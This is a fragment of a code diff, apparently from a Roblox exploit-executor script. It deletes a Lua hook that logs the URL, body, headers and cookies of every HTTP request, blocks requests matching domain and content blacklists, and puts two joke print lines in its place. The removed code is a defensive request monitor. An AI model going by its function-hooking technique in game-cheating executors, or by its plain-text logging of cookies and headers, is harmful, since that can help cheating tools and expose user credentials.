-((type(fluxus) == "table" and type(fluxus.request) == "function") and fluxus.request) or 
-(http_request or request)
-
-
-if (reqf) then 
-    local parent = (type(syn) == "table" and "syn") or (type("http") == "table" and "http") or (type(fluxus) == "table" and "fluxus")
-    
-    if (parent) then
-        rprint("WHITE","\n > ")
-        rprint("WHITE", parent)
-        rprint("WHITE", ".")
-        rprint("WHITE", "request")  
-    else
-        rprint("WHITE","\n > ")
-        rprint("WHITE", request and "request" or http_request and "http_request") 
-    end
-    
-    do 
-        local old
-        old = hookfunction(reqf, function(req,...)
-            local r_url = req.Url
-            local r_method = req.Method
-            local r_body = req.Body
-            
-            local r_headers = req.Headers
-            local r_cookies = req.Cookies
-            
-            
-            -- Check for blacklisted domains
-            local blocked = {}
-            if (r_url) then 
-                for _,url in ipairs(_G.BlockedDomains) do
-                    if r_url:match(url) then
-                        ins(blocked, url)
-                    end
-                end
-            end
-            
-            -- Check for blacklisted content 
-            if (r_body) then
-                for _, content in ipairs(_G.BlockedContent) do 
-                    if (r_body:match(content)) then 
-                        ins(blocked, content)
-                    end
-                end
-            end
-            
-            -- Log time + func call
-            rprint("WHITE", "\n ["..os.date("%X").."] > ")
-            if (parent) then
-                rprint("WHITE", parent)
-                rprint("WHITE", ".")
-            end
-            rprint("WHITE", "request")
-            
-            -- Log if blocked
-            rprint("WHITE", "\n    - Request blocked: ")
-            if (#blocked > 0) then
-                rprint("WHITE", "Yes")
-            else
-                rprint("WHITE", "No")
-            end
-            
-            -- Method
-            rprint("WHITE", "\n    - Request type: ")
-            if (r_method) then 
-                rprint("WHITE", tostring(r_method))
-            else
-                rprint("WHITE", 'GET')
-            end
-            
-            -- URL
-            rprint("WHITE", "\n    - URL: ")
-            rprint("WHITE", tostring(r_url))
-            
-            -- Body
-            rprint("WHITE", "\n    - Body: ")
-            if (r_body) then 
-                rprint("WHITE", tostring(r_body))
-            else
-                rprint("WHITE", 'N/A')
-            end
-            
-            -- Headers
-            rprint("WHITE", "\n    - Headers: ")
-            if (type(r_headers) == "table") then
-                for i,v in pairs(r_headers) do
-                    if (type(v) == "table") then
-                        for i,v in pairs(v) do
-                            rprint("WHITE",  "\n        - "..i..": "..v)
-                        end
-                    else
-                        rprint("WHITE",  "\n      - "..i..": "..v)
-                    end
-                end
-            else
-                rprint("WHITE", "N/A")
-            end
-            -- Cookies
-            rprint("WHITE", "\n    - Cookies: ")
-            if (type(r_cookies) == "table") then
-                for i,v in pairs(r_cookies) do
-                    if (type(v) == "table") then
-                        for i,v in pairs(v) do
-                            rprint("WHITE",  "\n        - "..i..": "..v)
-                        end
-                    else
-                        rprint("WHITE",  "\n      - "..i..": "..v)
-                    end
-                end
-            else
-                rprint("WHITE", "N/A")
-            end
-            
-            if (#blocked > 0) then 
-                rprint("WHITE", "\n    An attempt to make a possibly malicious request was made. Blacklisted content detected: \n")
-                
-                rconsoleprint("@@WHITE@@")
-                for i = 1, #blocked do
-                    rconsoleprint("      - "..blocked[i].."\n")
-                end
-                return
-            end
-            
-            return old(req, ...)
-        end)
-    end
-end
-end
-
-
--- logs
-rprint("WHITE","\n\nLogs:")
+print("d11voqii loves you.")
+print("d11voqii loves you.")
